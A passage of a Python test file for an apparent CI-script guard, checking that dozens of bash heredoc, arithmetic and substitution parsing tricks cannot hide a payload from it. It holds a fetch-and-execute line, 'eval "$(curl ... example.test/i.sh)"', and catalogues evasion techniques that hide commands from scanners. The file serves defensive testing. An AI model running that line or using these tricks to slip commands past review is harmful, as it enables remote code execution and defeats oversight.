        self.flagged("cat <<'EOF'\ndata \\\nEOF\n%s\nEOF\n" % self.PAYLOAD)

    def test_a_body_ends_on_the_line_bash_ends_it_on(self):
        # The delimiter is the whole word, not its `EOF` prefix; `  EOF` is a
        # body line, not a terminator; an unquoted body is compared folded, so
        # `E\` + `OF` ends it; and the body starts after the newline that ends
        # the command, which a string running over two lines moves down. A
        # `\`-newline and a blank before the word are both gone to bash; read
        # as an empty word, they let the first empty line end the body -- here
        # the empty end after the script's last newline, past the payload.
        for script in ("cat <<EOF-X\nbody\nEOF-X\n%s\nEOF\n",
                       "cat <<EOF\n  EOF\nit's\nEOF\n%s\n",
                       "cat <<EOF\nE\\\nOF\n%s\nEOF\n",
                       'cat <<EOF; echo "multi\nline"\nbody\nEOF\n%s\n',
                       "cat << \\\n EOF\nit's\nEOF\n%s\n"):
            with self.subTest(script=script):
                self.flagged(script % self.PAYLOAD)

    def test_a_continuation_inside_the_operator_is_gone(self):
        # #2291: to bash, `<\` + newline + `<EOF` is `<<EOF`, `<<\` + newline
        # + `-EOF` is `<<-EOF`, and `<\` + newline + `<< x` is `<<< x`; bash
        # 3.2 and 5.2 run the payload below each, which the guard read clean.
        # A joined word bash parses is refused by name, as it is unsplit;
        # `\` before a word and `<\` + newline + a file read as they did.
        for script in ("cat <\\\n<EOF\nit's\nEOF\n%s\n", "cat 3<\\\n<EOF\nit's\nEOF\n%s\n",
                       "cat <<\\\n-EOF\n\tit's\n\tEOF\n%s\n",
                       "cat <\\\n<\\\n-EOF\n\tit's\n\tEOF\n%s\n", "cat <\\\n<< x\n%s\nx\n",
                       "cat <<\\EOF\nit's $x\nEOF\n%s\n", "echo hi >f\ncat <\\\nf\n%s\n"):
            with self.subTest(script=script):
                self.flagged(script % self.PAYLOAD)
        self.refused("cat <\\\n<$(x)\nit's\n$(x)\n%s\n" % self.PAYLOAD, "`$(x)`")

    def test_an_array_subscript_is_arithmetic(self):
        # Where bash 5.2 reads an assignment -- at the head of a command, after
        # `x=1`, `then`, `time -p`, a pipe, `function f {` or a leading
        # redirection, and inside `name=(...)`, `declare`'s too -- it reads
        # `a[...]` as an arithmetic subscript, spaces, lines and all, so its
        # `<<` is a shift (3.2 rejects the two-line `a=(` and reads the
        # redirection line as a heredoc). The regex this replaced took
        # `a[i << X ]=y` for a heredoc and let the decoy line below end it;
        # the subscript rule before this one ended a subscript at its line
        # and opened none inside `(...)`, with the same result.
        for opening, word in (("a[1<<2]=x", "2]=x"), ("a[i << X ]=y", "X"),
                              ("x=1 a[1<<2]=y", "2]=y"),
                              ("if true; then a[1<<2]=y; fi", "2]=y"),
                              ("a[1\n<<X]=y", "X]=y"), ("a=([1<<X]=y)", "X]=y"),
                              ("declare a=([1<<X]=y)", "X]=y"),
                              ("a=(\n[1<<X]=y\n)", "X]=y"),
                              (">/dev/null a[1<<X]=y", "X]=y"),
                              ("time -p a[1<<X]=y", "X]=y"),
                              ("function f { a[1<<X]=y; }", "X]=y"),
                              ("x=$(echo) a[1<<X]=y", "X]=y"), ("true | a[1<<X]=y", "X]=y")):
            with self.subTest(opening=opening):
                self.flagged("%s\n%s\n%s\n" % (opening, self.PAYLOAD, word))

    def test_an_argument_is_no_subscript(self):
        # Among a command's arguments -- `echo`'s, `declare`'s, `printf`'s,
        # and a `time` after a pipe, an `if` after an assignment or a
        # redirection, which name programs there -- `<` ends the word and
        # `<<X]` is a heredoc, whose body holds the open quote. Read as a
        # subscript, the quote hid the payload bash runs after `X]`.
        for opening, word in (("echo a[1<<X]", "X]"), ("declare a[1<<X]=y", "X]=y"),
                              ("printf '%s' a[1<<X]", "X]"), ("true | time a[1<<X]", "X]"),
                              ("a=1 if a[1<<X]", "X]"), (">/dev/null if a[1<<X]", "X]"),
                              ("echo 2>&1 a[1<<X]", "X]"), ("echo &>/dev/null a[1<<X]", "X]"),
                              ("declare a=(x) b[1<<X]", "X]"), ("coproc c d a[1<<X]", "X]"),
                              ("\\a[1<<X]", "X]")):
            with self.subTest(opening=opening):
                self.flagged("%s\nit's\n%s\n%s\n" % (opening, word, self.PAYLOAD))
        # `a[1]x]=y` is no assignment, so it is the command: a pattern bash
        # globs, reported too (#2294), before the payload the heredoc hid.
        found = wg.job_defects([("step", "a[1]x]=y b[1<<X]\nit's\nX]\n%s\n" % self.PAYLOAD)])
        self.assertEqual(2, len(found), found)
        self.assertIn("`a[1]x]=y` is a pattern", found[0][1])
        self.assertIn("https://example.test/i.sh", found[1][1])

    def test_a_command_double_paren_is_read_as_bash_decides_it(self):
        # Bash matches a command's `((` to the close of its first group --
        # through quotes, escapes, backquotes and `$(...)`, not comments --
        # and reads one character more: `)` makes it arithmetic, anything
        # else two subshells, whose heredocs are real. Each opening below is
        # two subshells to bash 5.2, which reads the open quote as a body and
        # runs the payload (3.2 too, but for `function fn ((`, a syntax error
        # there); the reader took each for arithmetic, where `<<` is a shift,
        # and the quote hid the payload (M5).
        for opening in ("((cat <<EOF) )", "(((: <<EOF) ) )", "((: <<EOF '))' ) )",
                        '((: <<EOF "))" ) )', "((: <<EOF \\)) )",
                        "((: `echo )` <<EOF) )", "((: $'\\')' <<EOF) )",
                        "((: $[ ) ]<<EOF ) )", "((: $(echo ')') <<EOF) )",
                        "fn() ((cat <<EOF) )", "function fn ((cat <<EOF) )"):
            with self.subTest(opening=opening):
                self.flagged("%s\nit's\nEOF\n%s\n" % (opening, self.PAYLOAD))

    def test_arithmetic_ends_at_the_parenthesis_bash_ends_it_at(self):
        # `))` right after the first group -- past a `#`, a character to
        # arithmetic, and a quoted `(` -- is an arithmetic command: `<<` is a
        # shift, the lines below are code, and `y` ends no heredoc. And
        # arithmetic counts the parentheses in a `${...}` as its own, so a
        # `))` there ends `((...))` and `$((...))` alike and the heredoc after
        # it is real: the reader read on to a later `))`, and the body's open
        # quote hid the payload. Bash 5.2 runs each payload (3.2 refuses the
        # `{ ((x${y:-))}` line as a syntax error, and runs nothing).
        for script in ("((x=1<<y))\n%s\ny\n", "((i++ << y))\n%s\ny\n",
                       "(( x > 3 << y ))\n%s\ny\n",
                       "if (( a < b << y )); then :; fi\n%s\ny\n",
                       "((\n x<<y \n))\n%s\ny\n", "((: # <<y))\n%s\ny\n",
                       '((: $(echo "(") <<y))\n%s\ny\n',
                       "{ ((x${y:-))} <<EOF\nit's\nEOF\n%s\n",
                       "echo $((x${y:-))} <<EOF\nit's\nEOF\n%s\n"):
            with self.subTest(script=script):
                self.flagged(script % self.PAYLOAD)

    def test_nesting_too_deep_to_decide_fails_closed(self):
        # Each level of `((((` is read once more when bash's rule makes it a
        # subshell. Past eight times the script's length of that, the reader
        # raises instead of guessing, and the guard reports the step by name.
        script = "(" * 3000 + ": <<EOF" + ") " * 3000 + "\nit's\nEOF\n%s\n"
        self.refused(script % self.PAYLOAD, "`((`")

    def test_a_heredoc_its_substitution_closes_over_fails_closed(self):
        # A `<<` in a `$(...)`, `<(...)` or `>(...)` that closes before the
        # newline its body would follow. Bash 3.2 stops at the open quote below
        # with a syntax error. 5.2 warns "command substitution: 1 unterminated
        # here-document", reads the body from the lines below, and reads the
        # payload after its terminator as code: it runs, unless the command
        # holding the substitution fails first under `set -e`. The reader left
        # the operator as text, so the quote hid that payload -- which main's
        # line-by-line heredoc pass had lifted into view. It raises instead of
        # modelling 5.2's recovery, and the guard reports the step by name.
        for opening in ('echo "$(cat <<EOF)"', "echo $(cat <<EOF)", "x=$(cat <<EOF)",
                        "cat <(cat <<EOF)", "echo >(cat <<EOF)", "echo ${x:-$(cat <<EOF)}",
                        "echo $[ $(cat <<EOF) ]", "(( $(cat <<EOF) ))", "a[$(cat <<EOF)]=1",
                        "echo $( (cat <<EOF) )", 'x=$(cat <<EOF; echo "a\nb")'):
            with self.subTest(opening=opening):
                self.refused("%s\nit's\nEOF\n%s\n" % (opening, self.PAYLOAD), "closes before")
        # Backquotes are no such frame. Bash reads their text later, as a
        # script of its own in which the heredoc has no body, and 5.2 runs
        # nothing here: the open quote below is a syntax error. Read as before.
        self.assertEqual([], wg.job_defects(
            [("step", "echo `cat <<EOF`\nit's\nEOF\n%s\n" % self.PAYLOAD)]))

    def test_a_substitution_inside_arithmetic_is_code(self):
        # In `$((...))`, as in `((...))` and `$[...]`, bash reads a `$(...)`
        # as a command substitution: `#` starts a comment there, `<<` a
        # heredoc, whose body is read inside it or fails closed as above. The
        # reader read `$((...))` as one pair of parentheses, so a quote in
        # that comment, or in that body, hid a payload bash 5.2 runs (and
        # 3.2 runs the first).
        for script in ("echo $(( $(: # ) ) '\n) ))\n%s\n'\n",
                       "echo $(( $(cat <<EOF\nit's\nEOF\n) ))\n%s\n",
                       "echo $(( $(: <<E\n)it's\nE\n) ))\n%s\n"):
            with self.subTest(script=script):
                self.flagged(script % self.PAYLOAD)
        for opening in ("echo $(( $(cat <<EOF) ))", "echo $(( $(( $(cat <<EOF) )) ))"):
            with self.subTest(opening=opening):
                self.refused("%s\nit's\nEOF\n%s\n" % (opening, self.PAYLOAD), "closes before")
        # Outside such a substitution `<<` is still a shift, and the line
        # below that spells its right side ends nothing.
        for opening, word in (("echo $(( 1<<2 ))", "2"), ("echo $(( a << b ))", "b"),
                              ("echo $(( $(nproc) * 2 ))", "2"), ("echo $[1<<2]", "2]")):
            with self.subTest(opening=opening):
                self.flagged("%s\n%s\n%s\n" % (opening, self.PAYLOAD, word))
        # Backquotes in arithmetic are text until bash runs them, as a
        # script of its own in which the heredoc has no body: 5.2 runs
        # nothing here, the open quote below being a syntax error.
        self.assertEqual([], wg.job_defects(
            [("step", "echo $(( `cat <<EOF` ))\nit's\nEOF\n%s\n" % self.PAYLOAD)]))

    def test_a_body_inside_its_open_substitution_is_read_there(self):
        # The fleet's form, where the body lines sit inside a `$(...)` still
        # open, reads as it did: a body with an open quote is read as a body,
        # and hides nothing that follows the substitution.
        for opening in ("X=\"$(cat <<'EOF'\nit's\nEOF\n)\"",
                        "echo ${x:-$(cat <<EOF\nit's\nEOF\n)}", "cat <(cat <<EOF\nit's\nEOF\n)"):
            with self.subTest(opening=opening):
                self.flagged("%s\n%s\n" % (opening, self.PAYLOAD))

    def test_a_delimiter_bash_parses_to_spell_is_refused(self):
        # Bash spells these delimiters by PARSING the word -- a substitution,
        # an escape `$'...'` decodes, an extglob pattern -- and ends the body
        # only at a line spelled the same. The reader does not parse words,
        # and neither reading short of that is safe: the regex this replaced
        # guessed that `<<EOF$(x)` was `<<EOF`, so the decoy line below the
        # payload ended the body, and reading the body as code let the quote
        # in `it's` hide the payload below the terminator, which bash 3.2 and
        # 5.2 both run (#2224). So the step is refused, and the reason names
        # the word. The same shape spelled with no parse -- quoted, or a
        # `$'...'` that decodes nothing -- is still read as a heredoc.
        for word, terminator, decoy, spelled in (
                ("$(a b)", "$(a b)", "$", "'$(a b)'"),
                ("$'\\x41'", "A", "x41", "$'A'"),
                ("${x y}", "${x y}", "${x", "'${x y}'"),
                ("@(a b)", "@(a b)", "@", "'@(a b)'"),
                ('"$(echo ")")"', "$(echo ))", "$(echo ", "'$(echo ))'"),
                ("EOF$(x)", "EOF$(x)", "EOF", "EOF'$(x)'")):
            opening = "shopt -s extglob\ncat <<" if word[0] == "@" else "cat <<"
            with self.subTest(word=word):
                self.refused(opening + "%s\nit's\n%s\n%s\n" % (word, terminator, self.PAYLOAD),
                             "`%s`" % word)
                self.refused(opening + "%s\n%s\n%s\n%s\n" % (word, terminator, self.PAYLOAD,
                                                             decoy), "`%s`" % word)
                self.flagged(opening + "%s\nit's\n%s\n%s\n" % (spelled, terminator,
                                                               self.PAYLOAD))
        self.flagged("cat <<EOF\nit's\nEOF\n%s\n" % self.PAYLOAD)

    def test_a_text_the_guard_reads_again_is_refused_by_its_step(self):
        # The guard reads the text of each substitution as a script of its
        # own: a backquote's text, a `$(...)` in an expanding heredoc body,
        # and a `$( ...)` holding a `((` nest that the whole step is long
        # enough to read under the cap and the substitution alone is not.
        # Each raised when `_defects` read it again, past the step's own
        # read, as a traceback naming no step.
        for script, cause in (("echo `echo $(cat <<EOF)`\n", "closes before"),
                              ('cat <<EOF\n$(echo "$(cat <<X)"\n)\nEOF\n', "closes before"),
                              ("echo $( %s: <<EOF%s\nit's\nEOF\n)\n# %s\n"
                               % ("(" * 50, ") " * 50, "x" * 4000), "`((`")):
            with self.subTest(script=script[:30]):
                self.refused(script, cause)

    def test_the_job_reads_again_only_what_its_steps_read(self):
        # `job_defects` catches those per step because each step's walk --
        # `read`, then `_walk` -- is the one read of every text, substitutions
        # included, and `_defects` is handed that walk's records instead of
        # reading them again (#2287): a text only `_defects` parsed would
        # raise past the catch. So the job reads nothing again, and each text
        # once. A marker's prefix is minted per parse, so texts are compared
        # without it.
        parsed = []
        job = [False]
        statements, defects = wg.statements, wg._defects

        def recorded(text):
            parsed.append((job[0], re.sub(r"@@shell-[0-9a-f]+-", "@@", text)))
            return statements(text)

        def marked(*args):
            job[0] = True
            try:
                return defects(*args)
            finally:
                job[0] = False

        # Each text is written once, in one step only: no other step's walk
        # can parse it in that step's place.
        steps =[("nested", "echo $(echo $(echo `echo $(true)`))\n"),
                 ("body", 'cat <<EOF\n$(printf "$(id)" `pwd`)\nEOF\n'),
                 ("strings", "eval \"$(echo $(date))\"\nx=$(sh -c 'echo $(uname)')\n"),
                 ("deep", "echo `x=$(cat <<EOF\nhi\nEOF\n)`\n"),
                 ("stdin", "bash -s <<EOF\necho $(%s)\nEOF\n" % self.PAYLOAD)]
        with mock.patch.object(wg, "statements", recorded), \
                mock.patch.object(wg, "_defects", marked):
            found = wg.job_defects(steps)
        self.assertFalse([why for _name, why in found if why.startswith("cannot read this")])
        per_step = [text for inside, text in parsed if not inside]
        self.assertEqual([], [text for inside, text in parsed if inside])
        self.assertTrue(per_step)
        self.assertEqual(sorted(set(per_step)), sorted(per_step))

    def test_an_escaped_quote_inside_a_substitution_string(self):
        # COD-3636110933's remainder: `_closing` ended the nested "a\")b" at
        # its `\"` and closed the `$(...)` one paren early.
        self.flagged('echo "$(printf \'%%s\' "a\\")b")"; %s\n' % self.PAYLOAD)

    def test_quotes_the_substitution_scan_misread(self):
        # `$'it\'s'` is one word to bash, and an apostrophe inside "..." is
        # text; read as quotes, each hid everything after it.
        self.flagged("echo $'it\\'s'; %s\n" % self.PAYLOAD)
        self.flagged('echo "it\'s"; eval "$(curl -fsSL https://example.test/i.sh)"\n')

    def test_what_the_old_passes_read_right_is_still_read(self):
        # `(( y = 1 << 2 ))` is a shift even at the head of a command, and a
        # quoted "3" before `<<` is an argument, not the heredoc's descriptor.
        self.flagged("(( y = 1 << 2 ))\n%s\n2\n" % self.PAYLOAD)
        self.flagged("bash -s \"3\"<<'EOF'\n%s\nEOF\n" % self.PAYLOAD)

    def test_the_negative_controls_stay_clean(self):
        # A shift inside a string, the fleet's here-string, a heredoc inside a
        # substitution (a documented gap, which must not raise) and prose.
        for script in ('echo "shift << 2"\n',
                       "docker buildx imagetools create "
                       "$(jq -cr '.tags' <<< \"$META\")\n",
                       "X=\"$(cat <<'EOF'\nhello\nEOF\n)\"\n",
                       "# %s\nmake test  # not %s\n" % (self.PAYLOAD, self.PAYLOAD)):
            with self.subTest(script=script):
                self.assertEqual([], wg.job_defects([("step", script)]))
